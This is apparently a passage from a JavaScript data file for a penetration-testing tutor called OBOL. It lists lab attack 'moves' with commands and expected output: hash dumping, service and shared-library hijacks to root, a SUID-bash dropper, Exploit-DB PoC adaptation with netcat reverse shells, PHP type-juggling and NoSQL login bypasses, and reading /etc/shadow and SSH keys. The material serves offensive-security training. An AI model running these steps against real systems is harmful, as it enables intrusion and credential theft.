      ],
      "look": [
        "Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nthash>::: in secretsdump output."
      ],
      "win": "Local Administrator NTLM hash extracted for Pass-the-Hash.",
      "mistakes": [
        "Exporting only SAM without SYSTEM (SYSTEM holds the boot key required to decrypt SAM)."
      ]
    },
    {
      "when": "whoami /priv shows SeRestorePrivilege enabled on your token.",
      "land": [
        "Modify a SYSTEM service's ImagePath in HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> and restart the service."
      ],
      "look": [
        "The operation completed successfully. and SYSTEM shell callback on service start."
      ],
      "win": "Full NT AUTHORITY\\SYSTEM execution via SeRestorePrivilege service hijack.",
      "mistakes": [
        "Picking a service that your user cannot start or that does not run as LocalSystem."
      ]
    }
  ],
  "smbv1-vuln-verify": [
    {
      "when": "Port 445 is open on an older Windows or Samba target, or smb.v1 was flagged during recon.",
      "land": [
        "Run nmap with smb-protocols and smb-vuln-ms17-010 to verify the NT LM 0.12 (SMBv1) dialect and check for MS17-010 (EternalBlue)."
      ],
      "look": [
        "NT LM 0.12 (SMBv1) dangerous and VULNERABLE: Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)."
      ],
      "win": "Confirmed whether the target is vulnerable to MS17-010 before firing an exploit.",
      "mistakes": [
        "Running smb-vuln-ms17-010 repeatedly against fragile legacy targets without recording the first output."
      ]
    },
    {
      "when": "Fast non-destructive MS17-010 verification via NetExec.",
      "land": [
        "Run nxc smb {{target}} -M ms17-010 to check whether the target is vulnerable to EternalBlue."
      ],
      "look": [
        "MS17-010   [+] Host is likely VULNERABLE to MS17-010!"
      ],
      "win": "Safe confirmation of MS17-010 vulnerability status.",
      "mistakes": [
        "Jumping straight to a kernel exploit without confirming the vulnerability first."
      ]
    }
  ],
  "rpc-endpoint-abuse": [
    {
      "when": "Port 135 (MSRPC) or 593 is open and you want to map registered RPC interfaces and dynamic high ports.",
      "land": [
        "Run impacket-rpcdump @{{target}} to list all UUIDs, named pipes, and TCP endpoints registered with the Endpoint Mapper."
      ],
      "look": [
        "MS-EFSR, MS-RPRN (Print System), MS-PAR, orDRS/SAMR/LSARPC bindings and ncacn_ip_tcp dynamic ports."
      ],
      "win": "RPC interfaces and coercion/exploitation surfaces mapped.",
      "mistakes": [
        "Ignoring high TCP ports revealed by rpcdump when firewall rules block standard ports."
      ]
    },
    {
      "when": "Probing MSRPC / SMB named pipes anonymously with rpcclient.",
      "land": [
        "Connect with rpcclient -U '' -N {{target}} and run srvinfo, enumdomusers, and querydominfo."
      ],
      "look": [
        "user:[<username>] rid:[0x...] lines and domain/server info."
      ],
      "win": "Domain user list and server metadata extracted over anonymous RPC.",
      "mistakes": [
        "Forgetting -U '' -N so rpcclient prompts for your local Kali user's password."
      ]
    },
    {
      "when": "Dumping user descriptions, RIDs, and account flags over SAMR.",
      "land": [
        "Run impacket-samrdump against the target (anonymously or with a valid credential)."
      ],
      "look": [
        "Found user: <username>, uid = <rid> and any populated Comment/Description fields."
      ],
      "win": "Full SAMR user table and account descriptions dumped.",
      "mistakes": [
        "Missing cleartext passwords hidden inside user Comment/Description fields in samrdump output."
      ]
    }
  ],
  "fix-samr-null-denied": [
    {
      "when": "Anonymous SAMR user enumeration (enumdomusers / --users) failed with NT_STATUS_ACCESS_DENIED (blocker.samr_null_denied).",
      "land": [
        "Try the Guest account with RID brute-forcing (nxc smb {{target}} -u 'guest' -p '' --rid-brute) to enumerate users via LSARPC SID lookups."
      ],
      "look": [
        "SidTypeUser lines mapping RIDs to DOMAIN\\<username>."
      ],
      "win": "Domain usernames recovered via Guest RID cycling despite SAMR null restrictions.",
      "mistakes": [
        "Keeping -u '' when anonymous null sessions are blocked but Guest is enabled with a blank password."
      ]
    },
    {
      "when": "SAMR enumdomusers is blocked, but LSARPC anonymous SID/name translation may still be open.",
      "land": [
        "Run rpcclient lsaenumsid and lookupnames for well-known accounts to extract the domain SID, then cycle RIDs."
      ],
      "look": [
        "S-1-5-21-... domain SID and resolved account names."
      ],
      "win": "Domain SID and valid usernames enumerated through LSARPC.",
      "mistakes": [
        "Assuming all RPC calls are blocked just because SAMR enumdomusers returned NT_STATUS_ACCESS_DENIED."
      ]
    },
    {
      "when": "Both anonymous SAMR and Guest/LSARPC are restricted and you hold any low-privilege credential.",
      "land": [
        "Re-run user enumeration authenticated with nxc smb {{target}} -u '{{user}}' -p '{{password}}' --users."
      ],
      "look": [
        "Domain user list and descriptions returned over authenticated SAMR."
      ],
      "win": "Full user list and descriptions unlocked with authenticated access.",
      "mistakes": [
        "Retrying anonymous SAMR in a loop after RestrictAnonymousSAM has already denied it."
      ]
    }
  ],
  "post-proof-loot-sweep": [
    {
      "when": "After capturing /root/proof.txt or /home/*/local.txt on a Linux host in a multi-host environment.",
      "land": [
        "Run a one-shot sweep of /etc/shadow, ip -4 addr, ip route, arp -an, /etc/hosts, and SSH keys to uncover credentials and dual-homed internal subnets."
      ],
      "look": [
        "Additional NICs/subnets (172.16.x.x, 10.x.x.x), ARP neighbors, /etc/shadow hashes, and SSH private keys."
      ],
      "win": "Hashes, keys, and internal network routes collected for the next pivot host.",
      "mistakes": [
        "Closing the shell right after reading proof.txt and missing an internal subnet reachable only through this box."
      ]
    },
    {
      "when": "After capturing proof.txt or local.txt on a Windows host.",
      "land": [
        "Check ipconfig /all, route print, arp -a, and cmdkey /list (plus secretsdump from Kali if admin) to harvest cached credentials and internal routes."
      ],
      "look": [
        "Secondary network adapters, internal ARP peers, and stored credentials."
      ],
      "win": "Windows credentials and internal pivot routes harvested.",
      "mistakes": [
        "Forgetting to check ipconfig /all and arp -a for a second network interface on a compromised Windows host."
      ]
    }
  ],
  "edb-searchsploit-lookup": [
    {
      "when": "A scan, HTTP header, generator tag, or disclosed manifest reveals a specific version for a third-party product.",
      "land": [
        "Run searchsploit --exclude=\"/dos/\" against the product name and major.minor version, then paste the table back."
      ],
      "look": [
        "Remote Code Execution, Command Injection, Arbitrary File Upload, Auth Bypass, SQLi, or Local Privilege Escalation rows in .py, .sh, or .txt format."
      ],
      "win": "obol ranks the strongest standalone PoC (demoting Metasploit-only modules and dropping DoS noise) and unlocks mirroring.",
      "mistakes": [
        "Searching the full patch string (e.g. 2.2.15-ubuntu3) instead of product + major.minor (e.g. product 2.2), which misses range-titled advisories."
      ]
    },
    {
      "when": "You want machine-readable Exploit-DB metadata including verified status and full paths.",
      "land": [
        "Run searchsploit -j for the fingerprinted product and version and paste the JSON output."
      ],
      "look": [
        "RESULTS_EXPLOIT entries carrying EDB-ID, Verified, Title, and Path fields."
      ],
      "win": "Exact EDB-ID and local exploit path extracted automatically.",
      "mistakes": [
        "Firing a public PoC blindly without mirroring and reading its header and hardcoded constants first."
      ]
    }
  ],
  "edb-mirror-and-inspect": [
    {
      "when": "searchsploit surfaced a candidate EDB-ID and you need a writable working copy.",
      "land": [
        "Run searchsploit -m {{edb_id|48506}} to copy the PoC into your current working directory."
      ],
      "look": [
        "Copied to: /.../48506.py confirmation line."
      ],
      "win": "A local copy of the PoC sits in your working folder ready to audit and edit.",
      "mistakes": [
        "Editing files directly inside /usr/share/exploitdb/exploits instead of mirroring a local copy with -m."
      ]
    },
    {
      "when": "Inspecting the mirrored script before sending any traffic.",
      "land": [
        "Read the top 80 lines with head -n 80 {{edb_file|48506.py}} and paste them into obol."
      ],
      "look": [
        "CLI flags (argparse / sys.argv), hardcoded target/LHOST/LPORT variables, Python 2 print/urllib2 syntax, or 127.0.0.1:8080 debug proxies."
      ],
      "win": "obol extracts the script's CLI contract and flags any Python 2, proxy, or compile hazards ahead of execution.",
      "mistakes": [
        "Skipping inspection and letting a hardcoded 127.0.0.1:8080 Burp proxy silently blackhole the exploit."
      ]
    },
    {
      "when": "The PoC is long and argument parsing or callback variables sit near the bottom.",
      "land": [
        "Grep for argparse, add_argument, sys.argv, proxies, LHOST, LPORT, and target across the script."
      ],
      "look": [
        "Line numbers showing every required flag, positional argument, and hardcoded constant."
      ],
      "win": "Every parameter that needs target adaptation is identified before launch.",
      "mistakes": [
        "Updating RHOST at the top of a PoC while missing a second hardcoded URL or payload IP inside main()."
      ]
    }
  ],
  "edb-run-adapted-exploit": [
    {
      "when": "The inspected Python PoC takes named flags (--url/-u, --lhost, --lport).",
      "land": [
        "Start a listener (`nc -lvnp {{lport}}`) if the PoC sends a reverse shell, then run python3 {{edb_file|exploit.py}} with the script's exact flag names."
      ],
      "look": [
        "Command output (`uid=`, `whoami`) in stdout or an incoming connection on your netcat listener."
      ],
      "win": "You land command execution or an interactive foothold shell on the target.",
      "mistakes": [
        "Forgetting to include a non-root web base path (e.g. http://target/cms instead of http://target) when the app lives in a subdirectory."
      ]
    },
    {
      "when": "The inspected Python PoC reads positional arguments via sys.argv.",
      "land": [
        "Pass the target URL/IP, LHOST, and LPORT in the exact positional order printed by the script's Usage line."
      ],
      "look": [
        "Exploit stage markers completing and a shell callback arriving on your listener."
      ],
      "win": "Remote code execution or reverse shell established.",
      "mistakes": [
        "Swapping the order of target URL and callback IP in positional sys.argv scripts."
      ]
    },
    {
      "when": "The mirrored PoC is a Bash/curl script (.sh).",
      "land": [
        "Run bash {{edb_file|exploit.sh}} with the target host, port, and listener arguments expected by the script."
      ],
      "look": [
        "HTTP 200/302 stage responses followed by command output or reverse shell connection."
      ],
      "win": "Shell or remote command output returned from the target service.",
      "mistakes": [
        "Running a Windows-CRLF .sh PoC without stripping carriage returns first if it errors with bad interpreter."
      ]
    }
  ],
  "fix-edb-py2": [
    {
      "when": "A mirrored Python PoC fails (or pre-flight flags it) with Python 2 print statements, urllib2/urlparse/httplib imports, or CRLF/encoding errors.",
      "land": [
        "Run dos2unix, prepend `# -*- coding: utf-8 -*-`, and convert the script in place with `2to3 -w {{edb_file|exploit.py}}`."
      ],
      "look": [
        "RefactoringTool: Files that were modified: {{edb_file|exploit.py}}."
      ],
      "win": "Python 2 print, except, raw_input, and urllib2/urlparse imports are rewritten to valid Python 3.",
      "mistakes": [
        "Rewriting print statements manually one line at a time while leaving urllib2 and cookielib broken."
      ]
    },
    {
      "when": "Confirming the converted script compiles cleanly and checking for Python 3 bytes/str socket calls.",
      "land": [
        "Run python3 -m py_compile {{edb_file|exploit.py}} and inspect `.encode()` / `urllib.request` lines."
      ],
      "look": [
        "Zero syntax errors from py_compile; socket.send() or base64.b64encode() calls passing bytes (`b'...'` or `.encode()`)."
      ],
      "win": "The adapted PoC passes Python 3 compilation and is ready to execute.",
      "mistakes": [
        "Passing a Python 3 str instead of bytes (`payload.encode()`) into `socket.send()` or `base64.b64encode()`."
      ]
    }
  ],
  "fix-edb-python-deps": [
    {
      "when": "Running a PoC fails with `ModuleNotFoundError` (e.g. `No module named 'Crypto'`) or `pip install` fails with `error: externally-managed-environment` (PEP 668).",
      "land": [
        "Create `/tmp/edb-venv` with `python3 -m venv /tmp/edb-venv` and install the required libraries via `/tmp/edb-venv/bin/pip`."
      ],
      "look": [
        "Successfully installed pycryptodome requests beautifulsoup4 requests-toolbelt..."
      ],
      "win": "An isolated Python environment holds every exploit dependency without breaking Kali's PEP 668 system packages.",
      "mistakes": [
        "Installing the broken legacy `crypto` or `pycrypto` package instead of `pycryptodome` when a script writes `from Crypto.Cipher import AES`."
      ]
    },
    {
      "when": "Testing the PoC inside the newly created virtual environment.",
      "land": [
        "Invoke the script explicitly with `/tmp/edb-venv/bin/python3 {{edb_file|exploit.py}} --help`."
      ],
      "look": [
        "The PoC's help/usage banner prints with zero ImportError or ModuleNotFoundError."
      ],
      "win": "All third-party imports resolve cleanly and the PoC is ready to fire.",
      "mistakes": [
        "Running bare `python3` instead of `/tmp/edb-venv/bin/python3` after installing packages into the venv."
      ]
    }
  ],
  "fix-edb-proxy-tls": [
    {
      "when": "A PoC contains `proxies = {'http': 'http://127.0.0.1:8080'}` or fails with `ProxyError` / `Connection refused` to `127.0.0.1:8080`.",
      "land": [
        "Run sed -i to empty out hardcoded `127.0.0.1:8080` proxy dictionaries in `{{edb_file|exploit.py}}`."
      ],
      "look": [
        "Hardcoded localhost proxy dictionary replaced with `proxies = {}` / `proxies=None`."
      ],
      "win": "HTTP traffic from the PoC goes directly to the target instead of dying on a closed local Burp listener.",
      "mistakes": [
        "Assuming the target port closed when `Connection refused` actually points to `127.0.0.1:8080`."
      ]
    },
    {
      "when": "An HTTPS PoC crashes with `SSLCertVerificationError` / `CERTIFICATE_VERIFY_FAILED` against a self-signed lab certificate.",
      "land": [
        "Re-run with `PYTHONHTTPSVERIFY=0 CURL_CA_BUNDLE=\"\"` (and add `verify=False` or `ssl._create_unverified_context()` if the script pins verification)."
      ],
      "look": [
        "HTTPS handshake completes and the PoC receives the target's HTTP response."
      ],
      "win": "Self-signed TLS certificate verification no longer aborts the exploit.",
      "mistakes": [
        "Forgetting to switch `http://` to `https://` in the target URL argument when targeting SSL ports like 443 or 8443."
      ]
    }
  ],
  "fix-edb-c-compile": [
    {
      "when": "A C local/remote exploit fails on the target with `version GLIBC_2.34 not found`, `Exec format error`, or `gnu/stubs-32.h: No such file`.",
      "land": [
        "Compile on the target directly if `gcc` exists; otherwise compile statically on Kali (`-static`, plus `-m32` for 32-bit `i686` targets)."
      ],
      "look": [
        "`file exploit` showing `statically linked` and matching the target's 64-bit or 32-bit ELF architecture."
      ],
      "win": "A portable ELF binary with zero host GLIBC version mismatch is ready to stage and run.",
      "mistakes": [
        "Compiling dynamically on bleeding-edge Kali and expecting the binary to run on an older Ubuntu/Debian/CentOS target."
      ]
    },
    {
      "when": "The Exploit-DB C source targets Windows (`#include <windows.h>` / `winsock2.h`).",
      "land": [
        "Cross-compile on Kali with `x86_64-w64-mingw32-gcc` (or `i686-w64-mingw32-gcc` for 32-bit Windows) and link `-lws2_32`."
      ],
      "look": [
        "`PE32+ executable (console) x86-64, for MS Windows`."
      ],
      "win": "Standalone Windows `.exe` built cleanly from C source.",
      "mistakes": [
        "Omitting `-lws2_32` when cross-compiling Windows socket exploits with mingw."
      ]
    }
  ],
  "linux-custom-binary-triage": [
    {
      "when": "Enumeration flagged a non-standard SUID, sudo, capability, cron, or systemd binary outside stock OS binaries.",
      "land": [
        "Run `file`, `ls -la`, and `ldd` against `{{custom_bin|/opt/app/helper}}` and paste the output."
      ],
      "look": [
        "SUID root ownership, writable file/directory permissions, or `=> not found` / `/opt/...` shared libraries in `ldd`."
      ],
      "win": "Binary architecture, privilege bits, and missing or custom shared-library dependencies are mapped.",
      "mistakes": [
        "Spending hours hunting kernel CVEs while a custom SUID binary in `/opt` or `/usr/local/bin` sits uninspected."
      ]
    },
    {
      "when": "Checking whether the ELF binary searches a writable RPATH or RUNPATH before system library directories.",
      "land": [
        "Run `readelf -d {{custom_bin|/opt/app/helper}} | grep -iE 'rpath|runpath|needed'`."
      ],
      "look": [
        "`RPATH` or `RUNPATH` pointing to `/tmp`, `/var/tmp`, `$ORIGIN`, `/home/...`, or a writable `/opt/...` directory."
      ],
      "win": "Any hijackable ELF library search path is surfaced.",
      "mistakes": [
        "Only running `ldd` and missing a writable `RPATH` folder that shadows an existing library."
      ]
    },
    {
      "when": "Extracting embedded commands, script paths, and configuration references from the binary.",
      "land": [
        "Run `strings -n 4 {{custom_bin|/opt/app/helper}}` filtered for paths and command names, then paste the hits."
      ],
      "look": [
        "Bare commands without a leading `/` (e.g. `tar -czf ...`, `service apache2 start`, `ps aux`) or custom `/opt/.../*.sh` scripts."
      ],
      "win": "obol detects relative PATH hijack calls or external script/library dependencies automatically.",
      "mistakes": [
        "Mistaking an absolute `/usr/bin/tar` call for a PATH hijack (only bare command names resolve via `$PATH`)."
      ]
    },
    {
      "when": "Observing what the binary actually executes or opens at runtime.",
      "land": [
        "Run `ltrace {{custom_bin|/opt/app/helper}} 2>&1 | head -n 40` (or `strace -e trace=execve,openat -f` if stripped)."
      ],
      "look": [
        "`system(\"...\")`, `popen(\"...\")`, `execvp(\"...\")`, `dlopen(\"...\")`, or `ENOENT (No such file or directory)` opens."
      ],
      "win": "Exact runtime `system()`/`dlopen()` argument confirmed and routed to PATH or shared-object hijack.",
      "mistakes": [
        "Forgetting that `ltrace` drops effective SUID privileges during tracing: use `ltrace` to see the call, then run the binary normally to escalate."
      ]
    }
  ],
  "linux-shared-library-hijack": [
    {
      "when": "Binary triage found a missing `.so`, writable `RPATH`/`RUNPATH`, or `dlopen()` path loaded by a privileged binary.",
      "land": [
        "Create `/tmp/hijack.c` with an `__attribute__((constructor))` function calling `setuid(0); setgid(0); system(\"/bin/bash -p\");`."
      ],
      "look": [
        "`/tmp/hijack.c` written cleanly on the target (or compiled on Kali if `gcc` is absent on-host)."
      ],
      "win": "Shared-object constructor source is staged.",
      "mistakes": [
        "Omitting `-p` on `/bin/bash -p`, causing bash to drop effective uid 0 back to your real user uid."
      ]
    },
    {
      "when": "Compiling the `.so` into the target load path and triggering the privileged binary.",
      "land": [
        "Compile with `gcc -shared -fPIC /tmp/hijack.c -o /path/to/hijack_target.so` and execute `{{custom_bin|/opt/app/helper}}`."
      ],
      "look": [
        "`uid=0(root)` prompt spawning immediately as the dynamic linker runs your constructor."
      ],
      "win": "Root shell obtained via shared-object hijack.",
      "mistakes": [
        "Missing a required symbol version if shadowing an existing library (check `nm -D` on the original `.so` if the loader complains)."
      ]
    },
    {
      "when": "Binary triage revealed an external `.sh` or helper script at a writable or creatable path instead of a `.so`.",
      "land": [
        "Write a SUID-bash dropper (`cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash`) to the helper script path, `chmod +x` it, and run the binary."
      ],
      "look": [
        "`-rwsr-xr-x 1 root root ... /tmp/rootbash` followed by `uid=0(root)` from `/tmp/rootbash -p`."
      ],
      "win": "Root shell obtained via privileged helper-script hijack.",
      "mistakes": [
        "Forgetting `#!/bin/bash` and `chmod +x` when `execve()` invokes the helper script directly without `sh`."
      ]
    }
  ],
  "windows-custom-binary-triage": [
    {
      "when": "Service, scheduled-task, or autorun enumeration surfaced a non-standard `.exe` outside `C:\\Windows`.",
      "land": [
        "Run `icacls` against both `\"{{custom_bin|C:\\Tools\\service.exe}}\"` and its parent folder."
      ],
      "look": [
        "`(F)`, `(M)`, or `(W)` granted to `BUILTIN\\Users`, `Authenticated Users`, `Everyone`, or your current account."
      ],
      "win": "Direct binary overwrite or directory phantom-DLL write permission confirmed.",
      "mistakes": [
        "Checking ACLs only on the `.exe` and forgetting the parent directory (a writable folder allows phantom DLL hijacking even when the `.exe` itself is read-only)."
      ]
    },
    {
      "when": "Inspecting the Windows binary in place without dropping extra tools on the host.",
      "land": [
        "Run the PowerShell byte-reader one-liner to check for `mscoree.dll` (.NET) and dump embedded paths, `.dll`/`.ps1`/`.bat` calls, and connection strings."
      ],
      "look": [
        "`[+] Managed .NET assembly`, hardcoded `password=` / `Data Source=`, or external `.bat`/`.ps1`/`.dll` paths."
      ],
      "win": "Binary runtime type (.NET vs native C/C++) and embedded secrets or child scripts extracted.",
      "mistakes": [
        "Running `type binary.exe` in cmd.exe, which scrambles the terminal on raw binary bytes instead of extracting printable ASCII."
      ]
    },
    {
      "when": "The custom executable is a .NET assembly or native binary that you pulled back to Kali.",
      "land": [
        "Decompile with `ilspycmd ./service.exe` (or run `strings -n 5`) and paste the output into obol."
      ],
      "look": [
        "`Process.Start(...)` with a bare command or writable path, `[DllImport(\"custom.dll\")]`, `SqlConnection` strings, or hardcoded credentials."
      ],
      "win": "Full C# logic or native import bugs extracted, unlocking DLL hijack, scheduled-task/path hijack, or credential reuse.",
      "mistakes": [
        "Guessing what a custom `.NET` service does from black-box behavior when `ilspycmd` recovers its exact C# source in two seconds."
      ]
    }
  ],
  "web-source-sink-audit": [
    {
      "when": "An HTTP 500 stack trace, `phpinfo()`, LFI, or exposed backup revealed a server-side script or manifest path.",
      "land": [
        "Fetch `{{url}}{{source_path|/index.php}}` (or read it through your LFI wrapper) and paste the source or manifest JSON/XML."
      ],
      "look": [
        "Database connectors (`mysqli_connect`, `new PDO`, `mongodb://`), pinned framework/library versions, and route handlers."
      ],
      "win": "obol extracts hardcoded DB credentials, JWT secrets, versioned dependencies, and vulnerable code sinks.",
      "mistakes": [
        "Requesting a `.php` file directly over HTTP expecting source code when you found it via LFI (use `php://filter/convert.base64-encode/resource=...` over LFI)."
      ]
    },
    {
      "when": "You dumped multiple source files (from `.git`, `.bak`/`.zip`, or directory LFI) onto Kali.",
      "land": [
        "Grep recursively for `mysqli_connect`, `new PDO`, `SqlConnection`, `mongodb://`, `postgres://`, `jwt.sign`, `SECRET_KEY`, and `DB_PASS`."
      ],
      "look": [
        "Concrete username + password pairs and signing secrets in `.env`, `config.php`, `settings.py`, or `web.config`."
      ],
      "win": "Reusable database, SSH/SMB-reuse, or JWT signing credentials recovered from source.",
      "mistakes": [
        "Stopping at `index.php` without reading the `config.php` or `db.php` file it includes at line 2."
      ]
    },
    {
      "when": "Hunting for exploitable code execution, deserialization, or auth-bypass sinks across recovered source.",
      "land": [
        "Grep recursively for `shell_exec`, `system(`, `child_process`, `subprocess.`, `pickle.loads`, `yaml.load`, `unserialize(`, `strcmp(`, and `findOne(req.`."
      ],
      "look": [
        "Routes passing `$_GET`/`$_POST`, `req.body`/`req.query`, or `request.args` into one of those dangerous sinks."
      ],
      "win": "obol mints `web.vuln_sink` with the exact sink category and unlocks targeted white-box exploitation.",
      "mistakes": [
        "Continuing blind directory brute-forcing after you already hold the application's source code."
      ]
    }
  ],
  "web-vuln-sink-exploit": [
    {
      "when": "Disclosed source passes user input into `shell_exec`, `system`, `passthru`, `child_process.exec`, `os.system`, or `subprocess(..., shell=True)`.",
      "land": [
        "Send a request matching the exact HTTP method and parameter name in the code with `; id` or `| id` appended."
      ],
      "look": [
        "`uid=...` in the response body (or a callback on `nc -lvnp {{lport}}` / `tcpdump` if output is not echoed)."
      ],
      "win": "Confirmed remote command execution ready to upgrade to a reverse shell.",
      "mistakes": [
        "Forgetting to satisfy an outer `if (isset(...))` or prefix regex check that sits two lines above the `shell_exec` call."
      ]
    },
    {
      "when": "Disclosed source passes a cookie, header, or body field into `pickle.loads`, `yaml.load`, PHP `unserialize`, or `node-serialize`.",
      "land": [
        "Generate a serialized payload matching the language runtime and encoding (e.g. base64 pickle `__reduce__`, PyYAML `!!python/object/apply`, or `node-serialize` IIFE) and submit it."
      ],
      "look": [
        "Incoming reverse shell on `nc -lvnp {{lport}}` or command output returned in the HTTP response."
      ],
      "win": "Remote code execution achieved through white-box deserialization.",
      "mistakes": [
        "Sending raw binary pickle bytes when the source calls `pickle.loads(base64.b64decode(cookie))` (match the exact wrapper chain in the code)."
      ]
    },
    {
      "when": "Disclosed PHP source checks a login or token with `strcmp($_POST['password'], $secret) == 0` or loose `==` / `md5() ==`.",
      "land": [
        "Send `password[]=` (an empty array) against `strcmp() == 0`, or a magic `0e...` string when loose `==` compares `0e` hashes."
      ],
      "look": [
        "`302 Found` redirect with `Set-Cookie` session or authenticated admin dashboard HTML."
      ],
      "win": "Authentication bypassed cleanly via PHP type juggling (`web.authz_bypass`).",
      "mistakes": [
        "Trying `password[]=` on PHP 8.0+ where `strcmp(array, string)` throws a fatal `TypeError` instead of returning `NULL` (check the PHP version in headers first)."
      ]
    },
    {
      "when": "Disclosed Node/Express source passes `req.body` or `req.query` directly into MongoDB `.find()` / `.findOne()`.",
      "land": [
        "Send `Content-Type: application/json` with `{\"username\":\"admin\",\"password\":{\"$ne\":null}}` to the login route."
      ],
      "look": [
        "Authenticated JWT/session cookie or redirect into the admin interface."
      ],
      "win": "NoSQL operator injection bypasses login without knowing the password.",
      "mistakes": [
        "Sending JSON operators with default `application/x-www-form-urlencoded` headers when the Express app parses JSON via `express.json()`."
      ]
    }
  ],
  "web-terminal-foothold": [
    {
      "when": "Nmap or HTTP fingerprinting identifies ttyd, Wetty, GoTTY, or ShellInABox.",
      "land": [
        "Check the HTTP response headers with curl -sk -i to see if the web terminal is open or gated by Basic Auth."
      ],
      "look": [
        "HTTP 200 OK serving the xterm.js/ttyd HTML shell, or 401 WWW-Authenticate if credentials are required."
      ],
      "win": "Reachable browser terminal endpoint confirmed.",
      "mistakes": [
        "Assuming a high TCP port serving HTML is a static site without checking for a ttyd/Wetty WebSocket terminal."
      ]
    },
    {
      "when": "Connected to the interactive browser web terminal PTY.",
      "land": [
        "Run id, uname -a, and ip -br a inside the web terminal and paste the output into OBOL."
      ],
      "look": [
        "uid=..., group memberships, and host network interfaces."
      ],
      "win": "Interactive Linux foothold recorded; upgrade to SSH or reverse shell for file transfer convenience.",
      "mistakes": [
        "Staying inside a fragile browser tab without dropping an SSH key or catching a stable terminal shell."
      ]
    }
  ],
  "linux-privileged-group-abuse": [
    {
      "when": "`id` or enumeration output shows membership in a privileged host group (`disk`, `shadow`, or `adm`).",
      "land": [
        "Verify your active supplementary groups with `id` and map which block device backs `/` using `df -h /` and `lsblk`."
      ],
      "look": [
        "`6(disk)`, `42(shadow)`, or `4(adm)` in `groups=`, plus the root filesystem device path (such as `/dev/sda1`, `/dev/vda1`, or an LVM mapper volume)."
      ],
      "win": "You know which privileged group applies and, for `disk`, the exact block device backing `/`.",
      "mistakes": [
        "Guessing `/dev/sda1` blindly on NVMe, virtio (`/dev/vda1`), or LVM (`/dev/mapper/...`) systems without checking `df -h /` first."
      ]
    },
    {
      "when": "Your user belongs to the `disk` group and has read access to the root block device.",
      "land": [
        "Run `debugfs` in non-interactive `-R` mode against the root block device to dump `/etc/shadow` and `/root/.ssh/id_rsa` directly from the raw ext filesystem."
      ],
      "look": [
        "`root:$6$...` password hash lines from `/etc/shadow` or a `-----BEGIN ... PRIVATE KEY-----` block from `/root/.ssh/id_rsa`."
      ],
      "win": "Root password hash (`loot.shadow`) or root SSH private key (`loot.ssh_key` / `credential.ssh_key`) recovered without needing root VFS permissions.",
      "mistakes": [
        "Trying `cat /etc/shadow` directly when in `disk` instead of reading through `debugfs` on the underlying block device."
      ]
    },
    {
      "when": "Your user belongs to the `shadow` group.",
      "land": [
        "Verify group permissions on `/etc/shadow` (`root:shadow 0640`) and read the password hashes directly."
      ],
      "look": [
        "Non-empty password hash fields (`$y$`, `$6$`, `$5$`, `$2b$`) on `root` or administrative user entries."
      ],
      "win": "Full `/etc/shadow` hash dump ready for offline cracking with `hashcat` or `john`.",
      "mistakes": [
        "Ignoring non-root service or human user hashes in `/etc/shadow` that may crack faster and hold `ALL=(ALL) ALL` sudo rights."
      ]
    },
    {
      "when": "Your user belongs to the `adm` group (granting read access across `/var/log`).",
      "land": [
        "Search readable log files under `/var/log` for leaked credentials, tokens, failed-login password typos, or privileged script arguments."
      ],
      "look": [
        "Cleartext passwords, API keys, session tokens, or internal service URLs in `auth.log`, `syslog`, Apache/Nginx logs, or custom application logs."
      ],
      "win": "A leaked password or token recovered from protected logs that pivots via `su`, `sudo`, or SSH.",
      "mistakes": [
        "Skipping rotated `.1` or `.gz` archives under `/var/log` (`zgrep` checks compressed history too)."
      ]
    }
  ]
};

  // Move-level "What": the goal of the move in plain language, with NO assumed knowledge, and how it moves
  // the learner toward the flag. Authored once per move; OBOL.fieldNote() applies it to every command. These
  // are distilled from the Learn section's longer "why this, why now" teaching notes to one or two sentences,
  // so the canvas gives the point without overloading. Same voice as Learn, shorter.
  OBOL.FIELD_MOVE = {
    'recon-smb-anon': { what: 'SMB is Windows file sharing. You are trying to log in as nobody, an anonymous session, to read shared folders and the user list for free. A readable share full of configs, or a list of usernames, is often your first real lead toward a way in.' },
    'recon-web-triage': { what: 'You are finding out exactly what software runs the website, because the way in is completely different for WordPress, a custom app, or a Java server. This does not get you onto the box; it aims every slower step that follows at the right target.' },
    'recon-dns': { what: 'You are asking the name server for its full list of hosts. When it is misconfigured it hands over the whole internal map, and every hostname you collect is a new machine or website to attack on the way to a flag.' },
    'recon-snmp': { what: 'SNMP is a device-management service that often answers to the default word public with no login. If it does, it can leak running processes, accounts, and sometimes passwords, any of which can become your way onto the box.' },
    'recon-ike-vpn': { what: 'A VPN endpoint here can be tricked into leaking a password hash during its handshake. Crack that hash offline and you may hold a credential that logs in, which is real progress toward a flag.' },
    'recon-finger': { what: 'You are asking an old service to list the accounts on the machine. Real usernames are the raw material for guessing a password later, which is how many boxes are first opened.' },
    'recon-vnc': { what: 'VNC is remote desktop. The blunt question is whether it even asks for a password; if not, you are looking at the screen of the box, and a desktop is one short step from a shell and the flag.' },
    'vnc-desktop-shell': { what: 'You already have the target desktop in front of you. This turns that desktop into a real command shell, the foothold you need to start hunting the flag.' },
    'recon-smtp': { what: 'You are asking the mail server which usernames are real. A confirmed list of names makes a later password-guessing attack far more likely to land a working login.' },
    'recon-ftp': { what: 'FTP is file transfer. You are trying the free anonymous login, because an open FTP often exposes source code, backups, or a config file with a password in it, a foothold sitting in plain sight.' },
    'recon-mail': { what: 'You are reading what the mail service reveals about itself and the domain. Mailboxes also hold passwords and reset links, so a login here can hand you a credential toward the flag.' },
    'rdp-enum': { what: 'RDP is Windows remote desktop. You are reading the machine name and checking whether a password or hash you hold can log in, which would give you a full desktop on the box.' },
    'nfs-enum': { what: 'NFS shares a filesystem over the network. You are listing what it exports and to whom; a world-readable share, or one exported with no_root_squash, is a common route to a key or even to root.' },
    'nfs-to-foothold': { what: 'You are turning a shared NFS folder into an actual login, usually by reading or planting an SSH key. That gives you a foothold to hunt the flag from.' },
    'recon-telnet': { what: 'Telnet is an old, unencrypted remote login, almost always on something legacy like a router or printer. Those devices ship with documented default passwords, so the banner plus a default login can be an immediate foothold.' },
    'telnet-login': { what: 'You hold a username and password, and telnet is a login shell, so logging in here is the foothold you need to start finding the flag.' },
    'recon-rservices': { what: 'These old trust services can log you in with no password at all if the machine trusts your host. When they are open, that can be a direct shortcut to a shell, sometimes as root.' },
